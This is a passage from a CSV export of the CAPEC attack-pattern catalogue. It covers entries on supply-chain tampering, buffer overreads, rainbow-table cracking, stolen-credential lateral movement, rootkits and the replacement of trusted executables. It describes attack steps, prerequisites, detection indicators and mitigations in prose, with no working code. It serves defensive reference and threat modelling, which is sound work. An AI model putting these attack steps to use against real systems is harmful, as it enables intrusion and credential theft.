multiple identities, will help obscure the attack. Monitor the contribution site to try to determine if the code has been uploaded to the target system.::\",\"::Access to the open source code base being used by the manufacturer in a system being developed or currently deployed at a victim location.::\",\"::SKILL:Advanced knowledge about the inclusion and specific usage of an open source code project within system being targeted for infiltration.:LEVEL:High::\",\"\",\"\",\"\",\"\",\"::An adversary with access to an open source code project introduces a hard-to-find bug in the software that allows under very specific conditions for encryption to be disabled on data streams. The adversary commits the change to the code which is picked up by a manufacturer who develops VPN software. It is eventually deployed at the victim's location where the very specific conditions are met giving the adversary the ability to sniff plaintext traffic thought to be encrypted. This can provide to the adversary access to sensitive data of the victim.::\",\"::494::829::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1195.001:ENTRY NAME:Supply Chain Compromise: Software Dependencies and Development Tools::\",\"\",\n539,\"ASIC With Malicious Functionality\",Detailed,Draft,\"An attacker with access to the development environment process of an application-specific integrated circuit (ASIC) for a victim system being developed or maintained after initial deployment can insert malicious functionality into the system for the purpose of disruption or further compromise.\",\"\",Low,High,\"::NATURE:ChildOf:CAPEC ID:444::\",\"\",\"::The attacker must have working knowledge of some if not all of the components involved in the target system as well as the infrastructure and development environment of the manufacturer.::Advanced knowledge about the ASIC installed within the target system.::\",\"::SKILL:Able to develop and manufacture malicious subroutines for an ASIC environment without degradation of existing functions and processes.:LEVEL:High::\",\"\",\"\",\"\",\"\",\"::A hardware manufacturer periodically updates its ASIC with new features. The attacker, knowing the manufacturer runs email on a system adjacent to the hardware development systems used for ASIC design, sends a phishing email with a malicious attachment to the manufacturer. When viewed, the malicious attachment installs a backdoor that allows the attacker to remotely compromise the adjacent ASIC development system. The attacker is then able to exfiltrate and alter sensitive data on the ASIC system, allowing for future compromise once a new AISC is deployed at the victim location.::\",\"\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1195.003:ENTRY NAME:Supply Chain Compromise: Compromise Hardware Supply Chain::\",\"\",\n54,\"Query System for Information\",Standard,Draft,\"An adversary, aware of an application's location (and possibly authorized to use the application), probes an application's structure and evaluates its robustness by submitting requests and examining responses. Often, this is accomplished by sending variants of expected queries in the hope that these modified queries might return information beyond what the expected set of queries would provide.\",\"\",High,Low,\"::NATURE:ChildOf:CAPEC ID:116::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Determine parameters] Determine all user-controllable parameters of the application either by probing or by finding documentation::STEP:2:PHASE:Experiment:DESCRIPTION:[Cause error condition] Inject each parameter with content that causes an error condition to manifest::STEP:3:PHASE:Experiment:DESCRIPTION:[Modify parameters] Modify the content of each parameter according to observed error conditions::STEP:4:PHASE:Exploit:DESCRIPTION:[Follow up attack] Once the above steps have been repeated with enough parameters, the application will be sufficiently mapped out. The adversary can then launch a desired attack (for example, Blind SQL Injection)::\",\"::This class of attacks does not strictly require authorized access to the application. As Attackers use this attack process to classify, map, and identify vulnerable aspects of an application, it simply requires hypotheses to be verified, interaction with the application, and time to conduct trial-and-error activities.::\",\"::SKILL:Although fuzzing parameters is not difficult, and often possible with automated fuzzers, interpreting the error conditions and modifying the parameters so as to move further in the process of mapping the application requires detailed knowledge of target platform, the languages and packages used as well as software design.:LEVEL:Medium::\",\"::The Attacker needs the ability to probe application functionality and provide it erroneous directives or data without triggering intrusion detection schemes or making enough of an impact on application logging that steps are taken against the adversary. The Attack does not need special hardware, software, skills, or access.::\",\"::Repeated errors generated by the same piece of code are an indication, although it requires careful monitoring of the application and its associated error logs, if any.::\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::\",\"::Application designers can construct a 'code book' for error messages. When using a code book, application error messages aren't generated in string or stack trace form, but are cataloged and replaced with a unique (often integer-based) value 'coding' for the error. Such a technique will require helpdesk and hosting personnel to use a 'code book' or similar mapping to decode application errors/logs in order to respond to them normally.::Application designers can wrap application functionality (preferably through the underlying framework) in an output encoding scheme that obscures or cleanses error messages to prevent such attacks. Such a technique is often used in conjunction with the above 'code book' suggestion.::\",\"::Blind SQL injection is an example of this technique, applied to successful exploit. See also: CVE-2006-4705::Attacker sends bad data at various servlets in a J2EE system, records returned exception stack traces, and maps application functionality. In addition, this technique allows attackers to correlate those servlets used with the underlying open source packages (and potentially version numbers) that provide them.::\",\"::209::\",\"\",\"\",\n540,\"Overread Buffers\",Standard,Draft,\"An adversary attacks a target by providing input that causes an application to read beyond the boundary of a defined buffer. This typically occurs when a value influencing where to start or stop reading is set to reflect positions outside of the valid memory location of the buffer. This type of attack may result in exposure of sensitive information, a system crash, or arbitrary code execution.\",\"\",Low,High,\"::NATURE:ChildOf:CAPEC ID:123::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Identify target application] The adversary identifies a target application or program to perform the buffer overread on. Adversaries often look for applications that accept user input and that perform manual memory management.::STEP:2:PHASE:Experiment:DESCRIPTION:[Find attack vector] The adversary identifies an attack vector by looking for areas in the application where they can specify to read more data than is required.::STEP:3:PHASE:Exploit:DESCRIPTION:[Overread the buffer] The adversary provides input to the application that gets it to read past the bounds of a buffer, possibly revealing sensitive information that was not intended to be given to the adversary.::\",\"::For this type of attack to be successful, a few prerequisites must be met. First, the targeted software must be written in a language that enables fine grained buffer control. (e.g., c, c++) Second, the targeted software must actually perform buffer operations and inadequately perform bounds-checking on those buffer operations. Finally, the adversary must have the capability to influence the input that guides these buffer operations.::\",\"\",\"\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data:NOTE:By reading outside the boundary of the intended buffer, the adversary is potentially able to see any data that is stored on the disk. This could include secret keys, personal information, and sensitive files.::SCOPE:Availability:TECHNICAL IMPACT:Unreliable Execution:NOTE:Depending on the use of the target buffer, an application or system crash can be achieved.::\",\"\",\"\",\"::125::\",\"\",\"\",\n541,\"Application Fingerprinting\",Standard,Draft,\"An adversary engages in fingerprinting activities to determine the type or version of an application installed on a remote target.\",\"\",,Low,\"::NATURE:ChildOf:CAPEC ID:224::\",\"\",\"::None::\",\"\",\"\",\"\",\"\",\"\",\"\",\"::204::205::208::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1592.002:ENTRY NAME:Gather Victim Host Information: Software::\",\"\",\n542,\"Targeted Malware\",Standard,Draft,\"An adversary develops targeted malware that takes advantage of a known vulnerability in an organizational information technology environment. The malware crafted for these attacks is based specifically on information gathered about the technology environment. Successfully executing the malware enables an adversary to achieve a wide variety of negative technical impacts.\",\"\",,,\"::NATURE:ChildOf:CAPEC ID:549::NATURE:CanPrecede:CAPEC ID:662::\",\"\",\"\",\"\",\"\",\"::Software being run on a system matches a file signature found in a malware database::A suspicious module is loaded that is not regularly loaded by a system::Software on a system is making calls to GetProcAddress() which is a commonly used function to implement dynamic API resolution::\",\"\",\"\",\"\",\"\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1587.001:ENTRY NAME:Develop Capabilities: Malware::::TAXONOMY NAME:ATTACK:ENTRY ID:1027:ENTRY NAME:Obfuscated Files or Information::\",\"TYPE:Other:NOTE:Adversaries often utilize obfuscation techniques when developing malware with the purpose of either avoiding detection or prevent the target from reverse engineering and understanding a captured malware sample. Some of these techniques include, but are not limited to, binary padding, software packing, stripping symbols and strings from a payload, and utilizing dynamic API resolution.::\",\n543,\"Counterfeit Websites\",Detailed,Draft,\"Adversary creates duplicates of legitimate websites. When users visit a counterfeit site, the site can gather information or upload malware.\",\"\",,High,\"::NATURE:ChildOf:CAPEC ID:194::NATURE:CanPrecede:CAPEC ID:89::\",\"\",\"::None::\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1036.005:ENTRY NAME:Masquerading: Match Legitimate Name or Location::\",\"\",\n544,\"Counterfeit Organizations\",Detailed,Draft,\"An adversary creates a false front organizations with the appearance of a legitimate supplier in the critical life cycle path that then injects corrupted/malicious information system components into the organizational supply chain.\",\"\",,High,\"::NATURE:ChildOf:CAPEC ID:194::\",\"\",\"::None::\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\n545,\"Pull Data from System Resources\",Standard,Draft,\"An adversary who is authorized or has the ability to search known system resources, does so with the intention of gathering useful information. System resources include files, memory, and other aspects of the target system. In this pattern of attack, the adversary does not necessarily know what they are going to find when they start pulling data. This is different than CAPEC-150 where the adversary knows what they are looking for due to the common location.\",\"\",,,\"::NATURE:ChildOf:CAPEC ID:116::\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"::1239::1243::1258::1266::1272::1278::1323::1258::1330::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1005:ENTRY NAME:Data from Local System::::TAXONOMY NAME:ATTACK:ENTRY ID:1555.001:ENTRY NAME:Credentials from Password Stores:Keychain::\",\"\",\n546,\"Incomplete Data Deletion in a Multi-Tenant Environment\",Detailed,Draft,\"An adversary obtains unauthorized information due to insecure or incomplete data deletion in a multi-tenant environment. If a cloud provider fails to completely delete storage and data from former cloud tenants' systems/resources, once these resources are allocated to new, potentially malicious tenants, the latter can probe the provided resources for sensitive information still there.\",\"\",Low,Medium,\"::NATURE:ChildOf:CAPEC ID:545::\",\"\",\"::The cloud provider must not assuredly delete part or all of the sensitive data for which they are responsible.The adversary must have the ability to interact with the system.::\",\"::SKILL:The adversary requires the ability to traverse directory structure.:LEVEL:Low::\",\"\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data:NOTE:A successful attack that probes application memory will compromise the confidentiality of that data.::\",\"::Cloud providers should completely delete data to render it irrecoverable and inaccessible from any layer and component of infrastructure resources.::Deletion of data should be completed promptly when requested.::\",\"\",\"::284::1266::1272::\",\"\",\"\",\n547,\"Physical Destruction of Device or Component\",Standard,Draft,\"An adversary conducts a physical attack a device or component, destroying it such that it no longer functions as intended.\",\"\",,,\"::NATURE:ChildOf:CAPEC ID:607::\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\n548,\"Contaminate Resource\",Meta,Draft,\"An adversary contaminates organizational information systems (including devices and networks) by causing them to handle information of a classification/sensitivity for which they have not been authorized. When this happens, the contaminated information system, device, or network must be brought offline to investigate and mitigate the data spill, which denies availability of the system until the investigation is complete.\",\"::TERM:Data Spill:DESCRIPTION:When information is handled by an information system of a classification/sensitivity for which the system has not been authorized to handle.::\",Low,High,\"::NATURE:CanPrecede:CAPEC ID:607::\",\"\",\"::The adversary needs to have real or fake classified/sensitive information to place on a system::\",\"::SKILL:Knowledge of classification levels of systems:LEVEL:Low::SKILL:The ability to obtain a classified document or information:LEVEL:High::SKILL:The ability to fake a classified document:LEVEL:Low::\",\"\",\"\",\"::SCOPE:Availability:TECHNICAL IMPACT:Resource Consumption:NOTE:Denial of Service::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data:NOTE:Victims of the attack can be exposed to classified materials::\",\"::Properly safeguard classified/sensitive data. This includes training cleared individuals to ensure they are handling and disposing of this data properly, as well as ensuring systems only handle information of the classification level they are designed for.::Design systems with redundancy in mind. This could mean creating backing servers that could be switched over to in the event that a server has to be taken down for investigation.::Have a planned and efficient response plan to limit the amount of time a system is offline while the contamination is investigated.::\",\"::An insider threat was able to obtain a classified document. They have knowledge that a backend server which provides access to a website also runs a mail server. The adversary creates a throwaway email address and sends the classified document to the mail server. When an administrator checks the mail server they notice that it has processed an email with a classified document and the server has to be taken offline while they investigate the contamination. In the meantime, the website has to be taken down as well and access to the website is denied until the backend can be migrated to another server or the investigation is complete.::\",\"\",\"\",\"\",\n549,\"Local Execution of Code\",Meta,Stable,\"An adversary installs and executes malicious code on the target system in an effort to achieve a negative technical impact. Examples include rootkits, ransomware, spyware, adware, and others.\",\"\",Medium,High,\"\",\"\",\"::Knowledge of the target system's vulnerabilities that can be capitalized on with malicious code.The adversary must be able to place the malicious code on the target system.::\",\"\",\"::The means by which the adversary intends to place the malicious code on the system dictates the tools required. For example, suppose the adversary wishes to leverage social engineering and convince a legitimate user to open a malicious file attached to a seemingly legitimate email. In this case, the adversary might require a tool capable of wrapping malicious code into an innocuous filetype (e.g., PDF, .doc, etc.)::\",\"\",\"::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:Availability:TECHNICAL IMPACT:Other:NOTE:Depending on the type of code executed by the adversary, the consequences of this attack pattern can vary widely.::\",\"::Employ robust cybersecurity training for all employees.::Implement system antivirus software that scans all attachments before opening them.::Regularly patch all software.::Execute all suspicious files in a sandbox environment.::\",\"::BlueBorne refers to a set of nine vulnerabilities on different platforms (Linux, Windows, Android, iOS) that offer an adversary the ability to install and execute malicious code on a system if they were close in proximity to a Bluetooth enabled device. One vulnerability affecting iOS versions 7 through 9 allowed an attacker to overflow the Low Energy Audio Protocol since commands sent over this protocol are improperly validated and gain the elevated permissions of the Bluetooth stack. These vulnerabilities were a result of poor validation and were patched shortly after their exposure in 2017, but many non-updated devices remain vulnerable.::\",\"::829::\",\"\",\"\",\n55,\"Rainbow Table Password Cracking\",Detailed,Draft,\"An attacker gets access to the database table where hashes of passwords are stored. They then use a rainbow table of pre-computed hash chains to attempt to look up the original password. Once the original password corresponding to the hash is obtained, the attacker uses the original password to gain access to the system.\",\"\",Medium,Medium,\"::NATURE:ChildOf:CAPEC ID:49::NATURE:CanPrecede:CAPEC ID:600::NATURE:CanPrecede:CAPEC ID:151::NATURE:CanPrecede:CAPEC ID:560::NATURE:CanPrecede:CAPEC ID:561::NATURE:CanPrecede:CAPEC ID:653::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Determine application's/system's password policy] Determine the password policies of the target application/system.:TECHNIQUE:Determine minimum and maximum allowed password lengths.:TECHNIQUE:Determine format of allowed passwords (whether they are required or allowed to contain numbers, special characters, etc.).:TECHNIQUE:Determine account lockout policy (a strict account lockout policy will prevent brute force attacks).::STEP:2:PHASE:Explore:DESCRIPTION:[Obtain password hashes] An attacker gets access to the database table storing hashes of passwords or potentially just discovers a hash of an individual password.:TECHNIQUE:Obtain copy of database table or flat file containing password hashes (by breaking access controls, using SQL Injection, etc.):TECHNIQUE:Obtain password hashes from platform-specific storage locations (e.g. Windows registry):TECHNIQUE:Sniff network packets containing password hashes.::STEP:3:PHASE:Exploit:DESCRIPTION:[Run rainbow table-based password cracking tool] An attacker finds or writes a password cracking tool that uses a previously computed rainbow table for the right hashing algorithm. It helps if the attacker knows what hashing algorithm was used by the password system.:TECHNIQUE:Run rainbow table-based password cracking tool such as Ophcrack or RainbowCrack. Reduction function must depend on application's/system's password policy.::\",\"::Hash of the original password is available to the attacker. For a better chance of success, an attacker should have more than one hash of the original password, and ideally the whole table.::Salt was not used to create the hash of the original password. Otherwise the rainbow tables have to be re-computed, which is very expensive and will make the attack effectively infeasible (especially if salt was added in iterations).::The system uses one factor password based authentication.::\",\"::SKILL:A variety of password cracking tools are available that can leverage a rainbow table. The more difficult part is to obtain the password hash(es) in the first place.:LEVEL:Low::\",\"::Rainbow table of password hash chains with the right algorithm used. A password cracking tool that leverages this rainbow table will also be required. Hash(es) of the password is required.::\",\"::This is a completely offline attack that an attacker can perform at their leisure after the password hashes are obtained.::\",\"::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::\",\"::Use salt when computing password hashes. That is, concatenate the salt (random bits) with the original password prior to hashing it.::\",\"::BusyBox 1.1.1 does not use a salt when generating passwords, which makes it easier for local users to guess passwords from a stolen password file using techniques such as rainbow tables. See also: CVE-2006-1058::\",\"::261::521::262::263::654::916::308::309::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1110.002:ENTRY NAME:Brute Force:Password Cracking::\",\"\",\n550,\"Install New Service\",Detailed,Draft,\"When an operating system starts, it also starts programs called services or daemons. Adversaries may install a new service which will be executed at startup (on a Windows system, by modifying the registry). The service name may be disguised by using a name from a related operating system or benign software. Services are usually run with elevated privileges.\",\"\",,,\"::NATURE:ChildOf:CAPEC ID:542::\",\"\",\"\",\"\",\"\",\"\",\"\",\"::Limit privileges of user accounts so new service creation can only be performed by authorized administrators.::\",\"\",\"::284::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1543:ENTRY NAME:Create or Modify System Process::\",\"\",\n551,\"Modify Existing Service\",Detailed,Draft,\"When an operating system starts, it also starts programs called services or daemons. Modifying existing services may break existing services or may enable services that are disabled/not commonly used.\",\"\",,,\"::NATURE:ChildOf:CAPEC ID:542::\",\"\",\"\",\"\",\"\",\"\",\"\",\"::Limit privileges of user accounts so service changes can only be performed by authorized administrators. Also monitor any service changes that may occur inadvertently.::\",\"\",\"::284::522::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1543:ENTRY NAME:Create or Modify System Process::\",\"\",\n552,\"Install Rootkit \",Detailed,Draft,\"An adversary exploits a weakness in authentication to install malware that alters the functionality and information provide by targeted operating system API calls. Often referred to as rootkits, it is often used to hide the presence of programs, files, network connections, services, drivers, and other system components.\",\"\",Medium,High,\"::NATURE:ChildOf:CAPEC ID:542::\",\"\",\"\",\"\",\"\",\"\",\"\",\"::Prevent adversary access to privileged accounts necessary to install rootkits.::\",\"::A rootkit may take the form of a hypervisor. A hypervisor is a software layer that sits between the operating system and the processor. It presents a virtual running environment to the operating system. An example of a common hypervisor is Xen. Because a hypervisor operates at a level below the operating system it can hide its existence from the operating system.::Similar to a rootkit, a bootkit is a malware variant that modifies the boot sectors of a hard drive, including the Master Boot Record (MBR) and Volume Boot Record (VBR). Adversaries may use bootkits to persist on systems at a layer below the operating system, which may make it difficult to perform full remediation unless an organization suspects one was used and can act accordingly.::\",\"::284::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1014:ENTRY NAME:Rootkit::::TAXONOMY NAME:ATTACK:ENTRY ID:1542.003:ENTRY NAME:Pre-OS Boot:Bootkit::::TAXONOMY NAME:ATTACK:ENTRY ID:1547.006:ENTRY NAME:Boot or Logon Autostart Execution:Kernel Modules and Extensions::\",\"\",\n554,\"Functionality Bypass\",Meta,Draft,\"An adversary attacks a system by bypassing some or all functionality intended to protect it. Often, a system user will think that protection is in place, but the functionality behind those protections has been disabled by the adversary.\",\"\",Medium,High,\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"::424::1299::\",\"\",\"\",\n555,\"Remote Services with Stolen Credentials\",Standard,Stable,\"This pattern of attack involves an adversary that uses stolen credentials to leverage remote services such as RDP, telnet, SSH, and VNC to log into a system. Once access is gained, any number of malicious activities could be performed.\",\"\",,Very High,\"::NATURE:ChildOf:CAPEC ID:560::NATURE:CanPrecede:CAPEC ID:151::\",\"\",\"\",\"\",\"\",\"\",\"\",\"::Disable RDP, telnet, SSH and enable firewall rules to block such traffic. Limit users and accounts that have remote interactive login access. Remove the Local Administrators group from the list of groups allowed to login through RDP. Limit remote user permissions. Use remote desktop gateways and multifactor authentication for remote logins.::\",\"::Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS). There are other implementations and third-party tools that provide graphical access Remote Services similar to RDS. Adversaries may connect to a remote system over RDP/RDS to expand access if the service is enabled and allows access to accounts with known credentials.::Windows Remote Management (WinRM) is the name of both a Windows service and a protocol that allows a user to interact with a remote system (e.g., run an executable, modify the Registry, modify services). It may be called with the winrm command or by any number of programs such as PowerShell.::\",\"::522::308::309::294::263::262::521::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1021:ENTRY NAME:Remote Services::::TAXONOMY NAME:ATTACK:ENTRY ID:1114.002:ENTRY NAME:Email Collection:Remote Email Collection::::TAXONOMY NAME:ATTACK:ENTRY ID:1133:ENTRY NAME:External Remote Services::\",\"\",\n556,\"Replace File Extension Handlers\",Detailed,Draft,\"When a file is opened, its file handler is checked to determine which program opens the file. File handlers are configuration properties of many operating systems. Applications can modify the file handler for a given file extension to call an arbitrary program when a file with the given extension is opened.\",\"\",,,\"::NATURE:ChildOf:CAPEC ID:542::\",\"\",\"\",\"\",\"\",\"\",\"\",\"::Inspect registry for changes. Limit privileges of user accounts so changes to default file handlers can only be performed by authorized administrators.::\",\"\",\"::284::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1546.001:ENTRY NAME:Event Triggered Execution:Change Default File Association::\",\"\",\n558,\"Replace Trusted Executable\",Detailed,Stable,\"An adversary exploits weaknesses in privilege management or access control to replace a trusted executable with a malicious version and enable the execution of malware when that trusted executable is called.\",\"\",Low,High,\"::NATURE:ChildOf:CAPEC ID:542::\",\"\",\"\",\"\",\"\",\"\",\"\",\"\",\"::Specific versions of Windows contain accessibility features that may be launched with a key combination before a user has logged in (for example when they are on the Windows Logon screen). On Windows XP and Windows Server 2003/R2, the program (e.g. C:WindowsSystem32utilman.exe) may be replaced with cmd.exe (or another program that provides backdoor access). Then pressing the appropriate key combination at the login screen while sitting at the keyboard or when connected over RDP will cause the replaced file to be executed with SYSTEM privileges.::\",\"::284::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1505.005:ENTRY NAME:Server Software Component: Terminal Services DLL::::TAXONOMY NAME:ATTACK:ENTRY ID:1546.008:ENTRY NAME:Event Triggered Execution: Accessibility Features::\",\"\",\n559,\"Orbital Jamming\",Detailed,Draft,\"In this attack pattern, the adversary sends disruptive signals at a target satellite using a rogue uplink station to disrupt the intended transmission. Those within the satellite's footprint are prevented from reaching the satellite's targeted or neighboring channels. The satellite's footprint size depends upon its position in the sky; higher orbital satellites cover multiple continents.\",\"\",Low,High,\"::NATURE:ChildOf:CAPEC ID:601::\",\"\",\"::This attack requires the knowledge of the satellite's coordinates for targeting.::\",\"\",\"::A satellite uplink station.::\",\"\",\"::SCOPE:Availability:TECHNICAL IMPACT:Other:NOTE:A successful attack will deny the availability of the satellite communications for authorized users.::\",\"\",\"\",\"\",\"\",\"\",\n560,\"Use of Known Domain Credentials\",Meta,Stable,\"An adversary guesses or obtains (i.e. steals or purchases) legitimate credentials (e.g. userID/password) to achieve authentication and to perform authorized actions under the guise of an authenticated user or service.\",\"\",High,High,\"::NATURE:CanPrecede:CAPEC ID:151::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Acquire known credentials] The adversary must obtain known credentials in order to access the target system, application, or service.:TECHNIQUE:An adversary purchases breached username/password combinations or leaked hashed passwords from the dark web.:TECHNIQUE:An adversary leverages a key logger or phishing attack to steal user credentials as they are provided.:TECHNIQUE:An adversary conducts a sniffing attack to steal credentials as they are transmitted.:TECHNIQUE:An adversary gains access to a database and exfiltrates password hashes.:TECHNIQUE:An adversary examines outward-facing configuration and properties files to discover hardcoded credentials.::STEP:2:PHASE:Explore:DESCRIPTION:[Determine target's password policy] Determine the password policies of the target system/application to determine if the known credentials fit within the specified criteria.:TECHNIQUE:Determine minimum and maximum allowed password lengths.:TECHNIQUE:Determine format of allowed passwords (whether they are required or allowed to contain numbers, special characters, etc., or whether they are allowed to contain words from the dictionary).:TECHNIQUE:Determine account lockout policy (a strict account lockout policy will prevent brute force attacks if multiple passwords are known for a single user account).::STEP:3:PHASE:Experiment:DESCRIPTION:[Attempt authentication] Try each credential until the target grants access.:TECHNIQUE:Manually or automatically enter each credential through the target's interface.::STEP:4:PHASE:Exploit:DESCRIPTION:[Impersonate] An adversary can use successful experiments or authentications to impersonate an authorized user or system, or to laterally move within a system or application::STEP:5:PHASE:Exploit:DESCRIPTION:[Spoofing] Malicious data can be injected into the target system or into a victim user's system by an adversary. The adversary can also pose as a legitimate user to perform social engineering attacks.::STEP:6:PHASE:Exploit:DESCRIPTION:[Data Exfiltration] The adversary can obtain sensitive data contained within the system or application.::\",\"::The system/application uses one factor password based authentication, SSO, and/or cloud-based authentication.::The system/application does not have a sound password policy that is being enforced.::The system/application does not implement an effective password throttling mechanism.::The adversary possesses a list of known user accounts and corresponding passwords that may exist on the target.::\",\"::SKILL:Once an adversary obtains a known credential, leveraging it is trivial.:LEVEL:Low::\",\"::A list of known credentials.::A custom script that leverages the credential list to launch an attack.::\",\"::Authentication attempts use credentials that have been used previously by the account in question.::Authentication attempts are originating from IP addresses or locations that are inconsistent with the user's normal IP addresses or locations.::Data is being transferred and/or removed from systems/applications within the network.::Suspicious or Malicious software is downloaded/installed on systems within the domain.::Messages from a legitimate user appear to contain suspicious links or communications not consistent with the user's normal behavior.::\",\"::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authentication:TECHNICAL IMPACT:Gain Privileges::SCOPE:Confidentiality:SCOPE:Authorization:TECHNICAL IMPACT:Read Data::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::\",\"::Leverage multi-factor authentication for all authentication services and prior to granting an entity access to the domain network.::Create a strong password policy and ensure that your system enforces this policy.::Ensure users are not reusing username/password combinations for multiple systems, applications, or services.::Do not reuse local administrator account credentials across systems.::Deny remote use of local admin credentials to log into domain systems.::Do not allow accounts to be a local administrator on more than one system.::Implement an intelligent password throttling mechanism. Care must be taken to assure that these mechanisms do not excessively enable account lockout attacks such as CAPEC-2.::Monitor system and domain logs for abnormal credential access.::\",\"::Throughout 2015 and 2016, APT28 — also known as Pawn Storm, Sednit, Fancy Bear, Sofacy, and STRONTIUM — leveraged stolen credentials to infiltrate the Democratic National Committee (DNC), the United States Army, the World Anti-Doping Agency (WADA), the Court of Arbitration for Sport (TAS-CAS), and more. In most cases, the legitimate credentials were obtained via calculated spearphishing, tabnabbing, and DNS attacks targeted at corporate webmail systems. APT28 also executed several watering hole attacks, in addition to exploiting several zero-day vulnerabilities within Flash and Windows. The stolen credentials were then utilized to maintain authenticated access, laterally move within the local network, and exfiltrate sensitive information including DNC emails and personal medical records of numerous athletes. [REF-571]::In early 2019, FIN6 exploited stolen credentials from an organization within the engineering industry to laterally move within an environment via the Windows’ Remote Desktop Protocol (RDP). Multiple servers were subsequently infected with malware to create malware distribution servers, which were used to distribute the LockerGoga ransomware. [REF-573]::\",\"::522::307::308::309::262::263::654::1273::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1078:ENTRY NAME:Valid Accounts::\",\"\",\n561,\"Windows Admin Shares with Stolen Credentials\",Detailed,Draft,\"An adversary guesses or obtains (i.e. steals or purchases) legitimate Windows administrator credentials (e.g. userID/password) to access Windows Admin Shares on a local machine or within a Windows domain.\",\"\",,,\"::NATURE:ChildOf:CAPEC ID:653::NATURE:CanPrecede:CAPEC ID:151::NATURE:CanPrecede:CAPEC ID:165::NATURE:CanPrecede:CAPEC ID:549::NATURE:CanPrecede:CAPEC ID:545::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Acquire known Windows administrator credentials] The adversary must obtain known Windows administrator credentials in order to access the administrative network shares.:TECHNIQUE:An adversary purchases breached Windows administrator credentials from the dark web.:TECHNIQUE:An adversary leverages a key logger or phishing attack to steal administrator credentials as they are provided.:TECHNIQUE:An adversary conducts a sniffing attack to steal Windows administrator credentials as they are transmitted.:TECHNIQUE:An adversary gains access to a Windows domain system/files and exfiltrates Windows administrator password hashes.:TECHNIQUE:An adversary examines outward-facing configuration and properties files to discover hardcoded Windows administrator credentials.::STEP:2:PHASE:Experiment:DESCRIPTION:[Attempt domain authentication] Try each Windows administrator credential against the hidden network shares until the target grants access.:TECHNIQUE:Manually or automatically enter each administrator credential through the target's interface.::STEP:3:PHASE:Exploit:DESCRIPTION:[Malware Execution] An adversary can remotely execute malware within the administrative network shares to infect other systems within the domain.::STEP:4:PHASE:Exploit:DESCRIPTION:[Data Exfiltration] The adversary can remotely obtain sensitive data contained within the administrative network shares.::\",\"::The system/application is connected to the Windows domain.::The target administrative share allows remote use of local admin credentials to log into domain systems.::The adversary possesses a list of known Windows administrator credentials that exist on the target domain.::\",\"::SKILL:Once an adversary obtains a known Windows credential, leveraging it is trivial.:LEVEL:Low::\",\"::A list of known Windows administrator credentials for the targeted domain.::\",\"::Data is being transferred and/or removed from administrative network shares.::Suspicious or Malicious software is executed within administrative network shares.::Suspicious or Malicious software is downloaded/installed on systems within the domain.::\",\"::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authentication:TECHNICAL IMPACT:Gain Privileges::SCOPE:Confidentiality:SCOPE:Authorization:TECHNICAL IMPACT:Read Data::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::\",\"::Do not reuse local administrator account credentials across systems.::Deny remote use of local admin credentials to log into domain systems.::Do not allow accounts to be a local administrator on more than one system.::\",\"::APT32 has leveraged Windows' built-in Net utility to use Windows Administrative Shares to copy and execute remote malware. [REF-579]::In May 2017, APT15 laterally moved within a Windows domain via Windows Administrative Shares to copy files to and from compromised host systems. This further allowed for the remote execution of malware. [REF-578]::\",\"::522::308::309::294::263::262::521::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1021.002:ENTRY NAME:Remote Services:SMB/Windows Admin Shares::\",\"\",\n562,\"Modify Shared File\",Detailed,Draft,\"An adversary manipulates the files in a shared location by adding malicious programs, scripts, or exploit code to valid content. Once a user opens the shared content, the tainted content is executed.\",\"\",,,\"::NATURE:ChildOf:CAPEC ID:17::\",\"\",\"\",\"\",\"\",\"\",\"\",\"::Disallow shared content. Protect shared folders by minimizing users that have write access. Use utilities that mitigate exploitation like the Microsoft Enhanced Mitigation Experience Toolkit (EMET) to prevent exploits from being run.::\",\"\",\"::284::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1080:ENTRY NAME:Taint shared content::\",\"\",\n563,\"Add Malicious File to Shared Webroot\",Detailed,Draft,\"An adversaries may add malicious content to a website through the open file share and then browse to that content with a web browser to cause the server to execute the content. The malicious content will typically run under the context and permissions of the web server process, often resulting in local system or administrative privileges depending on how the web server is configured.\",\"\",,,\"::NATURE:ChildOf:CAPEC ID:17::\",\"\",\"\",\"\",\"\",\"\",\"\",\"::Ensure proper permissions on directories that are accessible through a web server. Disallow remote access 